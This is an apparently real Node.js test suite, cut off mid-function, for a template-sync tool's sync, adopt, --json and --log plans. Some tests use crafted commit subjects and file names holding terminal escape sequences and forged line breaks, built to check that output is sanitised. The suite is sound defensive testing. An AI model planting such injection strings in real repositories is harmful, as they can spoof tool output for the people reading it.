  const plan = adopt(listed, '--verbose');
  assert.equal(rows(plan.stdout)['process/merge.md'], 'changed by you → keep (.slipway/overrides.yaml)');
  assert.match(adopt(listed, '--apply', '--keep', 'process/merge.md=again').stderr, /process\/merge\.md is kept already by its entry in \.slipway\/overrides\.yaml — drop the --keep/);
  const r = adopt(listed, '--apply', '--keep', 'process/ours.md=our wording', '--revert', 'process/kept.md');
  assert.equal(r.status, 0, r.stderr);
  const d1 = spawnSync(process.execPath, [join(SRC, 'ci/checks/meta/d1-drift.mjs'), listed], { encoding: 'utf8' });
  assert.equal(d1.status, 0, d1.stdout);

  const stale = unadopted((d) => put(d, { '.slipway/overrides.yaml': 'overrides:\n  - path: process/same.md\n    reason: pristine, so stale\n' }));
  const before = treeHash(stale);
  const s = adopt(stale, '--apply', '--keep', 'process/merge.md=m', '--keep', 'process/ours.md=o', '--revert', 'process/kept.md');
  assert.equal(s.status, 1, s.stdout);
  assert.match(s.stderr, /\.slipway\/overrides\.yaml:2 {2}process\/same\.md — not one of slipway's files you changed since the base; remove it/);
  assert.equal(treeHash(stale), before);
});

test('ownDecisions: a base ID is slipway\'s; a target ID only under the target\'s own title, whatever its status (a reused number is the project\'s)', () => {
  const base = '## D-001 — Protect main *(open)*\n';
  const target = `${base}## D-015 — Projects take slipway updates *(decided)*\n## D-016 — Something newer *(decided)*\n`;
  const mine = '## D-001 — `main` is protected *(decided)*\n## D-015 — API framework: Fastify *(decided)*\n## D-016 — Something newer *(decided 2026-10-01)*\n## D-099 — Ours *(open)*\n## PD-1 — Moved *(open)*\n';
  // D-016 was copied in by hand and then decided: its status changed, its title did not, so it stays slipway's.
  assert.deepEqual(ownDecisions(mine, base, target.replace('Something newer *(decided)*', 'Something newer *(open — week 1)*')), ['D-015', 'D-099']);
});

test('sync from a target the source does not have (an unpushed commit): the plan notes it and still prints; --apply refuses', () => {
  const ahead = join(root, 'slipway-ahead');
  git(root, 'clone', '-q', slip, ahead);
  put(ahead, { 'process/same.md': 'changed locally, never pushed\n' });
  commit(ahead, 'unpushed');
  const dir = project();
  const run = (...args) => spawnSync(process.execPath, [join(ahead, 'scripts', 'new-project.mjs'), 'sync', ...args], { cwd: dir, encoding: 'utf8' });
  const r = run();
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /^│ {2}note: slipway's commits base → target are not listed: \S+ is not in \S+ \(unpushed\?\)$/m);
  const a = run('--apply');
  assert.equal(a.status, 1);
  assert.match(a.stderr, /is not in \S+ — push it first; nothing was written/);
});

test('adopt, then sync, from a base older than the ownership map: classified by the target\'s map, D1 green, and sync finds that base exactly', () => {
  // A slipway whose first commit has no dev/ownership.yaml, then one that adds it.
  const old = join(root, 'slipway-premap');
  mkdirSync(old);
  git(old, 'init', '-q', '-b', 'main');
  copyCode(old);
  const files = {
    '.gitignore': 'node_modules/\n',
    'README.md': '# slipway\n',
    'package.json': pkg({ a: 'echo a' }),
    'process/one.md': 'one\n',
    'process/two.md': 'two\n',
    'docs/PRD.md': '# PRD\n',
  };
  put(old, files);
  const P0 = commit(old, 'before the map');
  put(old, { 'dev/ownership.yaml': MAP_YAML, 'process/one.md': 'one, upstream\n' });
  commit(old, 'the map');
  // A project copied from P0 by hand, as new-project did before the manifest: a version, no sha.
  const proj = join(root, 'premap-project');
  mkdirSync(proj);
  git(proj, 'init', '-q', '-b', 'main');
  put(proj, { ...files, 'README.md': '# Ours\n\nBuilt on [slipway](SLIPWAY.md) 0.0.0-fixture.\n', 'process/two.md': 'two, ours\n' });
  commit(proj, 'chore: start from slipway 0.0.0-fixture');
  const run = (...args) => spawnSync(process.execPath, [join(old, 'scripts', 'new-project.mjs'), 'sync', ...args], { cwd: proj, encoding: 'utf8', env: { ...process.env, SLIPWAY_SOURCE: old } });
  const proposed = run('--adopt');
  assert.equal(proposed.status, 1);
  assert.match(proposed.stderr, new RegExp(`Closest commit on \\S+'s main:\\n  ${P0} — 1 of slipway's file`));
  const a = run('--adopt', '--apply', '--base', P0, '--keep', 'process/two.md=ours');
  assert.equal(a.status, 0, a.stderr);
  assert.match(a.stdout, /map: {4}the target's — the base predates dev\/ownership\.yaml/);
  const d1 = spawnSync(process.execPath, [join(SRC, 'ci/checks/meta/d1-drift.mjs'), proj], { encoding: 'utf8' });
  assert.equal(d1.status, 0, d1.stdout);
  const plan = run('--verbose');
  assert.equal(plan.status, 0, plan.stderr);
  assert.match(plan.stdout, new RegExp(`base: {3}${P0} `));
  assert.equal(rows(plan.stdout)['process/one.md'], 'replace');
});

test('adopt: a lesson the target ships under another file name (same id, same rule) is slipway\'s, not listed', () => {
  const renamed = join(root, 'slipway-renamed-lesson');
  git(root, 'clone', '-q', slip, renamed);
  const lesson = (rule) => `---\nid: L-05\nrule: ${rule}\nenforcement:\n  status: check\n  pointer: d1\n---\n`;
  put(renamed, { 'process/lessons/L-05-new-name.md': lesson('slipway rule') });
  commit(renamed, 'a lesson, renamed');
  const run = (dir) => spawnSync(process.execPath, [join(renamed, 'scripts', 'new-project.mjs'), 'sync', '--adopt'], { cwd: dir, encoding: 'utf8', env: { ...process.env, SLIPWAY_SOURCE: slip } });
  const copied = run(unadopted((d) => put(d, { 'process/lessons/L-05-old-name.md': lesson('slipway rule') })));
  assert.equal(copied.status, 0, copied.stderr);
  assert.doesNotMatch(copied.stdout, /L-05/);
  const own = run(unadopted((d) => put(d, { 'process/lessons/L-05-old-name.md': lesson('our own rule') })));
  assert.match(own.stdout, /^ {2}L-05 {2}process\/lessons\/L-05-old-name\.md$/m);
});

// ---- the remote check (#61): a warning, never a gate

// A project cloned from its own upstream, so a case can move the upstream without touching `base`.
function withUpstream() {
  const up = join(root, `upstream-${++n}`);
  git(root, 'clone', '-q', base, up);
  const dir = project();
  git(dir, 'remote', 'set-url', 'origin', up);
  git(dir, 'fetch', '-q');
  return { up, dir };
}
// sync prints it on the rail (`│  remote: `), sync --adopt as it always did (`  remote: `).
const remoteLine = (stdout) => stdout.match(/^(?: {2}|│ {2})remote: (.*)$/m)?.[1];

test('behind its upstream: sync and sync --adopt print one warning with the count and `git pull`, before the plan; --apply still applies', () => {
  const { up, dir } = withUpstream();
  put(up, { 'notes.md': 'one\n' });
  commit(up, 'merged on the remote');
  put(up, { 'notes.md': 'two\n' });
  commit(up, 'and another');
  const r = sync(dir);
  assert.equal(r.status, 0, r.stderr);
  assert.match(remoteLine(r.stdout), /^WARNING — main is 2 commits behind origin\/main; run `git pull` first$/);
  assert.equal(r.stdout.match(/remote:/g).length, 1);
  assert.ok(r.stdout.indexOf('remote:') < r.stdout.indexOf('Needs you by hand'), 'the warning comes before the plan');
  const a = adopt(unadopted2(dir));
  assert.match(remoteLine(a.stdout), /2 commits behind origin\/main; run `git pull`/);
  const again = withUpstream();
  put(again.up, { 'notes.md': 'one\n' });
  commit(again.up, 'merged on the remote');
  const applied = spawnSync(process.execPath, [join(slip, 'scripts', 'new-project.mjs'), 'sync', '--apply'], { cwd: again.dir, encoding: 'utf8' });
  assert.match(applied.stdout, /slipway sync applied on slipway\/sync-/);
  assert.match(remoteLine(applied.stdout), /behind/);
});
// The behind project as one that predates the manifest, for adopt: its .slipway removed and committed.
function unadopted2(dir) {
  rmSync(join(dir, '.slipway'), { recursive: true });
  commit(dir, 'before the manifest');
  return dir;
}

test('level with its upstream: no remote line, the plan as before', () => {
  const { dir } = withUpstream();
  const r = sync(dir);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(remoteLine(r.stdout), undefined);
  assert.equal(normalise(r.stdout), readFileSync(EXPECTED_SUMMARY, 'utf8'));
});

test('no upstream, or a fetch that fails: the plan prints, plus one line saying the remote was not checked', () => {
  const none = project();
  git(none, 'branch', '--unset-upstream');
  const r = sync(none);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(remoteLine(r.stdout), 'not checked — main has no upstream');
  assert.match(adopt(unadopted2(none)).stdout, /remote: not checked — main has no upstream/);

  const { dir } = withUpstream();
  git(dir, 'remote', 'set-url', 'origin', join(root, 'gone'));
  const off = sync(dir);
  assert.equal(off.status, 0, off.stderr);
  assert.match(remoteLine(off.stdout), /^not checked — could not fetch origin\/main: /);
  assert.match(off.stdout, /^└ {2}Next: /m);
});

test('a file slipway stopped shipping is planned once with no upstream diff, leaves the manifest on apply, and the next plan is silent (#98)', () => {
  const dir = project((d) => {
    const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
    m.files['README.md'] = { class: 'seeded', sha256: sha256(Buffer.from('# ours\n')), blob: git(slip, 'rev-parse', `${A}:README.md`) };
    put(d, { 'README.md': '# ours\n', [MANIFEST]: `${JSON.stringify(m, null, 2)}\n` });
    commit(d, 'a README slipway used to seed');
  });
  const plan = sync(dir, '--verbose');
  assert.equal(plan.status, 0, plan.stderr);
  assert.equal(rows(plan.stdout)['README.md'], 'no longer tracked');
  const run = sync(dir, '--apply');
  assert.equal(run.stderr, '', 'apply refused'); // exits 1 anyway: the shared fixture has rows that need the owner
  assert.equal(existsSync(join(dir, '.slipway/upstream/README.md.diff')), false, 'no diff is offered for it');
  assert.equal(readFileSync(join(dir, 'README.md'), 'utf8'), '# ours\n', "the project's file is untouched");
  const after = JSON.parse(readFileSync(join(dir, MANIFEST), 'utf8')).files;
  assert.equal(after['README.md'], undefined);
  assert.equal(after['package.json']?.class, 'merged', 'a merged entry the target no longer lists would stay; package.json is still shipped and stays recorded');
  const again = sync(dir, '--verbose');
  assert.doesNotMatch(again.stdout, /README\.md/);
});

// ---- --json (F-08 §2, #165): one case per Acceptance line
//
// A slipway ahead of B by commits that change no file: three conventional subjects, one that is not, one
// holding control characters, and a merge. Dated a minute apart, so "newest first" has one answer.
const SUBJECTS = ['feat(sync): x', 'fix: y', 'Update README', 'refactor(ci)!: w', 'docs(readme): on a side branch', 'feat: a\u001b[31mb\u0007c\u009b2Jd\u007f'];
const MERGE = 'Merge branch side into main';
const jsonSlip = join(root, 'slipway-json');
git(root, 'clone', '-q', slip, jsonSlip);
{
  let minute = 0;
  const at = (...args) => {
    const date = new Date(Date.now() + ++minute * 60_000).toISOString();
    execFileSync('git', args, { cwd: jsonSlip, env: { ...process.env, GIT_AUTHOR_DATE: date, GIT_COMMITTER_DATE: date }, stdio: 'ignore' });
  };
  for (const s of SUBJECTS.slice(0, 4)) at('commit', '-q', '--allow-empty', '-m', s);
  at('switch', '-q', '-c', 'side');
  at('commit', '-q', '--allow-empty', '-m', SUBJECTS[4]);
  at('switch', '-q', 'main');
  at('merge', '-q', '--no-ff', '-m', MERGE, 'side');
  at('commit', '-q', '--allow-empty', '-m', SUBJECTS[5]);
}
const jsonTarget = git(jsonSlip, 'rev-parse', 'HEAD');
// The shared project, its manifest pointed at that slipway: the target must be in the source to be listed.
const jsonProject = (edit) => project((d) => {
  const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
  m.source = jsonSlip;
  writeFileSync(join(d, MANIFEST), `${JSON.stringify(m, null, 2)}\n`);
  commit(d, 'a source ahead of B');
  if (edit) edit(d);
});
const jsonSync = (dir, ...args) => spawnSync(process.execPath, [join(jsonSlip, 'scripts', 'new-project.mjs'), 'sync', ...args], { cwd: dir, encoding: 'utf8' });
const branches = (dir) => git(dir, 'branch', '--list', '--format=%(refname:short)');

test('--json: one schema-1 document with every row --verbose counts and every non-merge subject, nothing on stderr, exit 0, nothing written', () => {
  const dir = jsonProject();
  const before = treeHash(dir);
  const r = jsonSync(dir, '--json');
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.stderr, '');
  const doc = JSON.parse(r.stdout);
  assert.equal(r.stdout, `${JSON.stringify(doc, null, 2).replace(/[\u007f-\u009f]/g, (c) => `\\u00${c.charCodeAt(0).toString(16)}`)}\n`, 'stdout is the document, indented by two, and a newline');
  assert.equal(treeHash(dir), before, 'sync --json wrote to the project');

  assert.equal(doc.schema, 1);
  assert.deepEqual(Object.keys(doc), ['schema', 'branch', 'source', 'base', 'target', 'remote', 'notes', 'commits', 'buckets', 'rows', 'needsYou', 'overrides', 'skillChanged', 'next']);
  assert.deepEqual([doc.branch, doc.source, doc.base, doc.target, doc.notes], ['main', jsonSlip, A, jsonTarget, []]);
  assert.equal(doc.remote, null, 'level with its upstream: the text plan prints no remote line');
  const lone = jsonProject((d) => git(d, 'branch', '--unset-upstream'));
  assert.equal(JSON.parse(jsonSync(lone, '--json').stdout).remote, 'not checked — main has no upstream');
  assert.equal(remoteLine(jsonSync(lone).stdout), 'not checked — main has no upstream', 'the line the text plan prints');
  assert.equal(doc.next, 'npx github:matldupont/slipway#main sync --apply');

  // The text plans of the same project: the merge is in this fixture, and only --json leaves it out.
  const verbose = jsonSync(dir, '--verbose').stdout;
  assert.match(verbose, new RegExp(`^ {2}${MERGE}$`, 'm'));
  assert.equal(doc.rows.length, Number(verbose.match(/^(\d+) rows: /m)[1]));
  assert.deepEqual(doc.rows.map((row) => [row.label, row.path]), [...verbose.matchAll(/^ {2}(\S.*?) {2,}(\S+(?: scripts\.\S+)?)$/gm)].map((m) => [m[1], m[2]]), 'each row, in the order --verbose lists them');
  for (const row of doc.rows) assert.deepEqual(Object.keys(row), ['kind', 'label', 'path']);

  const subjects = doc.commits.map((c) => c.subject);
  assert.deepEqual(subjects, [...SUBJECTS, 'B', 'A1: one slipway file added', 'A0: docs and scripts only'].sort((a, b) => subjects.indexOf(a) - subjects.indexOf(b)), 'every non-merge subject, once, and no other');
  assert.deepEqual(subjects, git(jsonSlip, 'log', '--no-merges', '--format=%s', `${A}..${jsonTarget}`).split('\n'), 'newest first, as git lists them');
  assert.deepEqual(subjects.slice(0, 3), [SUBJECTS[5], SUBJECTS[4], SUBJECTS[3]]);
  assert.ok(!subjects.includes(MERGE));

  assert.deepEqual(doc.buckets.map((b) => b.kind), KINDS.filter((k) => doc.rows.some((row) => row.kind === k)), 'every non-empty kind, unchanged included, in KINDS order');
  for (const b of doc.buckets) {
    assert.equal(b.count, doc.rows.filter((row) => row.kind === b.kind).length);
    assert.equal(b.label, doc.rows.find((row) => row.kind === b.kind).label);
    assert.ok(verbose.includes(`${b.count} ${b.label}`) && b.meaning.length > 20, b.kind);
  }
  assert.deepEqual(JSON.parse(jsonSync(dir, '--plan', '--json').stdout), doc, '--plan --json is the same document');
});

test('--json: a subject\'s control characters are escaped on stdout — C0, DEL and C1 — and parse back as they were', () => {
  const r = jsonSync(jsonProject(), '--json');
  assert.doesNotMatch(r.stdout, /[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/);
  assert.equal(JSON.parse(r.stdout).commits[0].subject, SUBJECTS[5]);
});

test('--json: `feat(sync): x` is type feat, scope sync; a `!` and a missing scope parse; `Update README` has neither', () => {
  const by = Object.fromEntries(JSON.parse(jsonSync(jsonProject(), '--json').stdout).commits.map((c) => [c.subject, [c.type, c.scope]]));
  assert.deepEqual(by['feat(sync): x'], ['feat', 'sync']);
  assert.deepEqual(by['fix: y'], ['fix', null]);
  assert.deepEqual(by['refactor(ci)!: w'], ['refactor', 'ci']);
  assert.deepEqual(by['Update README'], [null, null]);
  assert.deepEqual(by['A1: one slipway file added'], [null, null], 'an upper-case type is not one');
});

test('--json: needsYou has one item for the collision, its `next` the line the text plan prints; the list is the text plan\'s, and the stale override is in `overrides`', () => {
  const dir = jsonProject();
  const doc = JSON.parse(jsonSync(dir, '--json').stdout);
  const text = jsonSync(dir).stdout;
  const collisions = doc.needsYou.filter((i) => i.path === 'process/clash.md');
  assert.equal(collisions.length, 1);
  assert.equal(collisions[0].kind, 'collision');
  assert.equal(collisions[0].next, text.match(/^│ {2}collision +process\/clash\.md\n│ {4}next: (.*)$/m)[1]);
  const listed = [...text.matchAll(/^│ {2}(\S.*?) {2,}(\S.*)\n│ {4}next: (.*)$/gm)].map((m) => ({ kind: m[1], path: m[2], next: m[3] }));
  assert.equal(listed.length, Number(text.match(/^◆ {2}Needs you by hand \((\d+)\)$/m)[1]));
  assert.deepEqual(doc.needsYou, listed);
  assert.deepEqual(doc.overrides, { absorbed: [], stale: [{ line: 4, path: 'process/kept.md' }] });
});

test('--json: an override --apply will remove is in `overrides.absorbed`, not in needsYou', () => {
  const dir = pristine((d) => put(d, {
    'process/replace.md': show(B, 'process/replace.md'), // the owner's edit is the one slipway shipped
    '.slipway/overrides.yaml': override('process/replace.md'),
  }));
  const r = sync(dir, '--json');
  assert.equal(r.status, 0, r.stderr);
  const doc = JSON.parse(r.stdout);
  assert.deepEqual(doc.overrides, { absorbed: [{ line: 2, path: 'process/replace.md' }], stale: [] });
  assert.deepEqual(doc.needsYou, []);
});

test('--json with --apply or --verbose is refused before anything runs: `sync: ` on stderr, stdout empty, exit 1, no branch and no file written', () => {
  const dir = jsonProject();
  const before = treeHash(dir);
  const heads = branches(dir);
  for (const [flag, why] of [['--apply', /^sync: --json is for the plan; --apply prints for the owner — nothing was written\n$/], ['--verbose', /^sync: --json and --verbose: choose one — nothing was written\n/]]) {
    for (const args of [['--json', flag], [flag, '--json']]) {
      const r = jsonSync(dir, ...args);
      assert.equal(r.status, 1, `${args}`);
      assert.match(r.stderr, why);
      assert.equal(r.stdout, '');
      assert.equal(treeHash(dir), before, `${args} wrote to the project`);
      assert.equal(branches(dir), heads);
    }
  }
});

test('--json: a refusal (a dirty tree) is `sync: ` on stderr, stdout empty, exit 1', () => {
  const r = jsonSync(jsonProject((d) => put(d, { 'notes.txt': 'untracked\n' })), '--json');
  assert.equal(r.status, 1);
  assert.match(r.stderr, /^sync: the working tree is not clean \(1 path\(s\)\)/);
  assert.equal(r.stdout, '');
});

// ---- the owner's plan and what --apply did (F-08 §3–§4, #166): one case per Acceptance line
//
// The --json fixture above serves here too: slipway ahead by feat, fix and other commits, one subject with
// control characters, and a merge.
const CONTROL = /[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/;
const lines = (stdout) => stdout.replace(/\n$/, '').split('\n');
// A project before its owner's edits, with `from` as its source: nothing in it needs the owner.
const pristineFrom = (from) => pristine((d) => {
  const m = manifestOf(d);
  m.source = from;
  put(d, { [MANIFEST]: `${JSON.stringify(m, null, 2)}\n` });
});
const runFrom = (from, dir, ...args) => spawnSync(process.execPath, [join(from, 'scripts', 'new-project.mjs'), 'sync', ...args], { cwd: dir, encoding: 'utf8' });

test('the plan on a pipe: no escape, no full sha, no "rows" or "unchanged", no fix or merge subject; what needs the owner is the first section and the next command the last line', () => {
  const r = jsonSync(jsonProject());
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.stderr, '', 'a progress line on a pipe');
  assert.doesNotMatch(r.stdout, /\u001b/);
  assert.doesNotMatch(r.stdout, /[0-9a-f]{40}/);
  assert.doesNotMatch(r.stdout, /rows|unchanged/);
  for (const subject of ['fix: y', MERGE, 'Update README', 'on a side branch']) assert.ok(!r.stdout.includes(subject), subject);
  const out = lines(r.stdout);
  assert.match(out[0], new RegExp(`^◇ {2}slipway sync on main · ${A.slice(0, 7)} → ${jsonTarget.slice(0, 7)} · 9 changes: 2 new, 1 fix, 6 other$`));
  assert.match(out.slice(1).find((l) => /^[◆◇]/.test(l)), /^◆ {2}Needs you by hand \(4\)$/);
  assert.match(out.at(-1), /^└ {2}Next: .*sync --apply$/);
  assert.doesNotMatch(r.stdout, /The base is the slipway commit/, 'the base is explained by --help');

  // With nothing owed the first section is the one line that says so.
  const calm = lines(runFrom(jsonSlip, pristineFrom(jsonSlip)).stdout);
  assert.equal(calm.slice(1).find((l) => /^[◆◇]/.test(l)), '◇  Nothing needs you by hand.');
  assert.match(calm.at(-1), /^└ {2}Next: .*sync --apply$/);
});

test('200 commits, 10 of them new features, nothing owed: the plan is at most 30 lines, with 8 features and `… +2 more`', () => {
  const many = join(root, 'slipway-many');
  git(root, 'clone', '-q', slip, many);
  for (let i = 0; i < 200; i += 1) git(many, 'commit', '-q', '--allow-empty', '-m', i % 20 === 0 ? `feat(area${i}): new thing ${i}` : `fix: mend ${i}`);
  const r = runFrom(many, pristineFrom(many));
  assert.equal(r.status, 0, r.stderr);
  const out = lines(r.stdout);
  assert.ok(out.length <= 30, `${out.length} lines`);
  assert.match(out[0], / · 203 changes: 10 new, 190 fixes, 3 other$/);
  assert.equal(out.filter((l) => /new thing \d+$/.test(l)).length, 8);
  assert.ok(out.includes('│  … +2 more'), r.stdout);
  assert.ok(out.includes("◇  What's new (10; every change: --log)"), r.stdout);
  assert.ok(out.includes('◇  Nothing needs you by hand.'));
  assert.doesNotMatch(r.stdout, /mend/);
});

test('only template changes besides files that are the same: the plan says "Settled with you: <n> of your files", and never "Nothing needs you."', () => {
  const docsOnly = join(root, 'slipway-docs-only');
  git(root, 'clone', '-q', slip, docsOnly);
  git(docsOnly, 'checkout', '-q', '-B', 'main', A);
  put(docsOnly, { 'docs/PRD.md': '# PRD, reworded\n' });
  commit(docsOnly, 'docs: reword the PRD template');
  const r = runFrom(docsOnly, pristineFrom(docsOnly));
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /^◇ {2}Settled with you: 1 of your files started from slipway's template, and the template changed\.$/m);
  assert.doesNotMatch(r.stdout, /Nothing needs you\./);
  assert.doesNotMatch(r.stdout, /What changes|What's new/, 'a section with nothing in it');
});

test('--log: every non-merge subject base → target, newest first, in place of what\'s new, and no merge subject', () => {
  const dir = jsonProject();
  const r = jsonSync(dir, '--log');
  assert.equal(r.status, 0, r.stderr);
  const subjects = git(jsonSlip, 'log', '--no-merges', '--format=%s', `${A}..${jsonTarget}`).split('\n');
  const out = lines(r.stdout);
  const at = out.indexOf(`◇  Every change (${subjects.length})`);
  assert.ok(at > 0, r.stdout);
  assert.deepEqual(out.slice(at + 1, at + 1 + subjects.length), subjects.map((s) => `│  ${clean(s)}`));
  assert.ok(!r.stdout.includes(MERGE));
  assert.doesNotMatch(r.stdout, /What's new/);
  assert.match(out.at(-1), /^└ {2}Next: .*sync --apply$/);
  // The rest of the plan is the default one's.
  const plain = lines(jsonSync(dir).stdout);
  assert.deepEqual(out.slice(0, at), plain.slice(0, plain.indexOf("◇  What's new (2; every change: --log)")));
});

test('--log is for the plan alone: with --apply, --json or --verbose it is refused before anything runs', () => {
  const dir = jsonProject();
  const before = treeHash(dir);
  for (const [flag, why] of [['--apply', /^sync: --log is for the plan; --apply prints what it did — nothing was written\n$/], ['--json', /^sync: --log and --json: choose one/], ['--verbose', /^sync: --log and --verbose: choose one/]]) {
    const r = jsonSync(dir, '--log', flag);
    assert.equal(r.status, 1, flag);
    assert.match(r.stderr, why);
    assert.equal(r.stdout, '');
  }
  assert.equal(treeHash(dir), before);
});

// sync run in this process, as a terminal would run it: `isTTY` streams, and a `github:` source that git
// reads from the local fixture (url.<path>.insteadOf), so the header's links are real and nothing reaches a network.
async function onTerminal(env, { argv = [], outTTY = true, errTTY = true } = {}) {
  const dir = jsonProject((d) => {
    const m = manifestOf(d);
    m.source = 'github:fixture/slipway';
    put(d, { [MANIFEST]: `${JSON.stringify(m, null, 2)}\n` });
    commit(d, 'a github source');
  });
  const stream = (isTTY) => ({ isTTY, columns: 200, text: '', write(t) { this.text += t; } });
  const [out, err] = [stream(outTTY), stream(errTTY)];
  const redirect = { GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: `url.${jsonSlip}.insteadOf`, GIT_CONFIG_VALUE_0: 'https://github.com/fixture/slipway.git' };
  const before = Object.fromEntries(Object.keys(redirect).map((k) => [k, process.env[k]]));
  Object.assign(process.env, redirect);
  try {
    const { main } = await import(join(jsonSlip, 'scripts', 'sync.mjs'));
    const status = main(argv, { cwd: dir, out, err, env });
    return { status, stdout: out.text, stderr: err.text, dir };
  } finally {
    for (const [k, v] of Object.entries(before)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }
}

test('on a terminal with NO_COLOR=1 and FORCE_HYPERLINK=1: no colour sequence, a link around each sha and each path that needs the owner, and one progress line on stderr, cleared', async () => {
  const r = await onTerminal({ NO_COLOR: '1', FORCE_HYPERLINK: '1' });
  assert.equal(r.status, 0, r.stderr);
  assert.doesNotMatch(r.stdout, /\u001b\[[0-9;]*m/);
  const link = (text, url) => `\u001b]8;;${url}\u0007${text}\u001b]8;;\u0007`;
  for (const sha of [A, jsonTarget]) assert.ok(r.stdout.includes(link(sha.slice(0, 7), `https://github.com/fixture/slipway/commit/${sha}`)), `no link around ${sha.slice(0, 7)}`);
  assert.match(r.stdout, /\u001b\]8;;file:\/\/[^\u0007]*\/process\/clash\.md\u0007process\/clash\.md\u001b\]8;;\u0007/);
  assert.match(r.stdout, /\u001b\]8;;file:\/\/[^\u0007]*\/package\.json\u0007package\.json scripts\.b\u001b\]8;;\u0007/, 'a script links to the file that holds it');
  const progress = "◇  Reading slipway's history…";
  assert.equal(r.stderr, `${progress}\r${' '.repeat(progress.length)}\r`);
  // Never on a pipe, never with --json: stdout piped while stderr is a terminal, and --json on a terminal.
  assert.equal((await onTerminal({}, { outTTY: false })).stderr, '');
  assert.equal((await onTerminal({}, { errTTY: false })).stderr, '', 'stdout a terminal, stderr not');
  assert.equal((await onTerminal({}, { argv: ['--json'] })).stderr, '');
  // Colour on, links off: styled, and no link.
  const coloured = await onTerminal({});
  assert.match(coloured.stdout, /\u001b\[[0-9;]*m/);
  assert.doesNotMatch(coloured.stdout, /\u001b\]8;/);
});

test('what\'s new is cut to the terminal\'s width with `…`; a pipe is never cut', () => {
  const view = { root, branch: 'main', source: 'x', base: A, target: B, notes: [], commits: [`feat(sync): ${'long '.repeat(30)}end`], owed: [], counts: {}, next: 'sync --apply' };
  const narrow = lines(planText(ui({ isTTY: true, columns: 40 }, { NO_COLOR: '1' }), view)).find((l) => l.startsWith('│  sync  '));
  assert.equal(narrow.length, 40);
  assert.ok(narrow.endsWith('…'));
  assert.ok(lines(planText(ui({ isTTY: false }, {}), view)).some((l) => l.endsWith('long end')));
  // A path holding a line break stays on its own line of the rail.
  const forged = planText(ui({ isTTY: false }, {}), { ...view, owed: [{ kind: 'collision', path: 'docs/x.md\n└  Next: forged', next: 'n', file: 'docs/x.md' }] });
  assert.equal(lines(forged).filter((l) => l.startsWith('└')).length, 1);
});

test('a subject holding ESC, BEL, DEL and U+009B: none reaches stdout from the plan, --log or --verbose, and ordinary text is as it was', () => {
  const dir = jsonProject();
  const shown = clean(SUBJECTS[5]).slice('feat: '.length);
  for (const args of [[], ['--log'], ['--verbose']]) {
    const r = jsonSync(dir, ...args);
    assert.equal(r.status, 0, r.stderr);
    assert.doesNotMatch(r.stdout, CONTROL, `${args}`);
    assert.ok(r.stdout.includes(shown), `${args}: the subject's own text is gone`);
  }
});

test('a refusal that quotes a file name holding ESC and BEL prints neither on stderr', () => {
  const r = sync(project((d) => put(d, { 'a\u001b[31mred\u0007.txt': 'untracked\n' })));
  assert.equal(r.status, 1);
  assert.match(r.stderr, /^sync: the working tree is not clean \(1 path\(s\)\)[\s\S]*a\[31mred\.txt/);
  assert.doesNotMatch(r.stderr, CONTROL);
});

test('a refusal that quotes a file name holding a line break prints the name on one line', () => {
  const r = sync(project((d) => put(d, { 'a\nb\n└ forged.txt': 'untracked\n' })));
  assert.equal(r.status, 1);
  assert.match(r.stderr, /^sync: the working tree is not clean \(1 path\(s\)\)[^\n]*:\n {2}\?\? a b └ forged\.txt\n$/);
});

// The ignored-paths refusal is left out: `git check-ignore` C-quotes a path holding a line break, so no raw one reaches it.
test('checkWrites quotes a path holding a line break on one line in its symlink and blocked-parent refusals', () => {
  const bad = 'a\nb\n└ forged';
  const dir = project();
  const refusal = (...args) => { try { checkWrites(...args); } catch (e) { return e.message; } assert.fail('no refusal'); };
  symlinkSync(dir, join(dir, bad));
  const notFile = refusal(dir, [bad]);
  put(dir, { 'blocker\nx': 'mine\n' });
  const blocked = refusal(dir, [`blocker\nx/${bad}`]);
  for (const m of [notFile, blocked]) {
    assert.doesNotMatch(m, /\n {2}[^\n]*\n[^\n]*└ forged/, m);
    assert.equal(m.split('\n').length, 2, m);
  }
});

// The class guard (#209): every value a refusal in sync.mjs or adopt.mjs interpolates is shown through `oneLine`,
// or is listed here with why a line break cannot get through it. A new unlisted interpolation fails this test.
const NOT_OUTSIDE_TEXT = new Map([
  ['USAGE', 'fixed text'],
  ['MANIFEST', 'a constant'],
  ['OVERRIDES', 'a constant'],
  ["json ? '--json' : '--verbose'", 'fixed text'],
  ["o.keep.has(p) ? '--keep' : '--revert (or remove that entry first)'", 'fixed text'],
  ['dirty.length', 'a count'],
  ['shown', 'built from `oneLine` lines'],
  ['e.message', "an earlier Refusal's message, whose values were shown through `oneLine` where it was made"],
  ['redactUrls(gitReason(e))', 'gitReason is one line of git output'],
  ['gitReason(e)', 'one line of git output'],
  ['(d1.stdout + d1.stderr).trim()', "a slipway check's own report; preflight read the manifest first, and it refuses a key holding a control character"],
  ['short(target)', 'a sha the code computed'],
  ['short(sha)', 'a sha the code computed'],
  ['name', 'a git branch name, and git refuses one holding a control character'],
  ['from', 'a git branch name, and git refuses one holding a control character'],
  ['hint.from', 'a label the code sets'],
  ['c(r.best)', 'a sha and a one-line commit subject (`%s`)'],
  ["r.runnerUp ? `  runner-up: ${c(r.runnerUp)}\\n` : ''", 'a sha and a one-line commit subject (`%s`)'],
  ['syncCommand(root)', 'a command the code builds, shell-quoted'],
  ['r.best.sha', 'a sha the code computed'],
  ['short(base)', 'a sha the code computed'],
  ['r.total', 'a count'],
  ["r.runnerUp ? `, then ${c(r.runnerUp)}` : ''", 'a sha and counts the code computed'],
]);

// Each `${…}` expression inside a `new Refusal(…)` call, found by counting parentheses and braces.
function refusalInterpolations(file) {
  const src = readFileSync(join(SRC, file), 'utf8');
  const found = [];
  for (let at = src.indexOf('new Refusal('); at !== -1; at = src.indexOf('new Refusal(', at + 1)) {
    let depth = 0;
    for (let i = at + 'new Refusal'.length; i < src.length; i++) {
